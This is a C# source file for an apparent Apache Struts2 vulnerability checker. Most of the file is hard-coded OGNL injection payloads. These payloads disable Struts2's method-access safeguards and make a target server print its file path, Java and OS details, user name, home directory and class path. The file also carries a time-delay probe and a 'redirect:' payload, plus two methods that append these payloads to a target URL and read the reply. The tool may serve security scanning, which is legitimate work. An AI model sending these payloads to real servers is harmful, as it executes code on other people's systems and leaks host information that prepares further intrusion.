using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;

namespace Struts2Checker
{
    //web请求类
    class Webrequester
    {
        //物理路径
        const string pPsyPath =                     @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43req.getRealPath(""\u005c""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pJava_Home =                   @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""java.home""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pJava_Version =                @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""java.version""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pOS_Name =                     @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""os.name""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pOS_Arch =                     @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""os.arch""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pOS_Version =                  @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""os.version""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pUser_Name =                   @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""user.name""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pUser_Home =                   @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""user.home""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pUser_Dir =                    @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""user.dir""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pJava_Class_Version =          @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""java.class.version""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pJava_Class_Path =             @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""java.class.path""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pJava_vm_specification_name =  @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(@java.lang.System@getProperty(""java.vm.specification.name""))')(d))&(i99)(('\43xman.getWriter().close()')(d))";
        const string pSleep                      =  @"('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(8000)')(d))";
        const string p2012                       =  @"('\43_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(d))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(asdf)(('\43rp\75@org.apache.struts2.ServletActionContext@getResponse()')(c))&(fgd)(('\43rp.getWriter().print(%22dolo%22)')(d))&(fgd)&(grgr)(('\43rp.getWriter().close()')(d))";
        const string apS2016                     =  @"redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%22dolo%22%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D";

        public int ResponseTime(string Check_Url, string Check_Method)
        {
            //返回数据
            
            int timeOut = 16000;

            //传入需要解析的网页地址
            string url = Check_Url;
            switch (Check_Method)
            {
                case "Original":
                    url = Check_Url;
                    break;
                case "Vul":
                    url = Check_Url + pSleep;
                    break;
                default:
                    url = Check_Url;
                    break;
            }

            DateTime start_time = DateTime.Now;
            WebRequest request = WebRequest.Create(url);
            //将标头设置为指定值
            request.Headers.Set("pragma", "no-cache");
            
            WebResponse response = null;
            try
            {
                //可能会有超时异常
                request.Timeout = timeOut;
                response = request.GetResponse();//获取URL数据
            }
            catch (WebException e)
            {
                Console.WriteLine("[*] 错误：{0}", e);
            }
            DateTime end_time = DateTime.Now;
            TimeSpan ts = end_time - start_time;
            int ch = (int)ts.TotalMilliseconds;//响应时间.(毫秒)
            return ch;
        }

        public string Webrequest(string Check_Url, string Check_Method)
        {
            //返回数据
            string sData = "";
            int timeOut = 16000;

            //传入需要解析的网页地址
            string url = Check_Url;
            switch (Check_Method)
            {
                case "2013":
                    url = Check_Url + apS2016;
                    break;
                case "2012":
                    url = Check_Url + p2012;
                    break;
                default:
                    url = Check_Url;
                    break;
            }


            WebRequest request = WebRequest.Create(url);
            //将标头设置为指定值
            request.Headers.Set("pragma", "no-cache");
            
            WebResponse response = null;
            try
            {
                //可能会有超时异常
                request.Timeout = timeOut;
                response = request.GetResponse();//获取URL数据
            }
            catch (WebException e)
            {
                //Console.WriteLine("ex：{0}", e);
            }
            if (response != null)
            {
                StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding("utf-8"));
                sData = reader.ReadToEnd();
            }
            return sData;
        }
    }
}
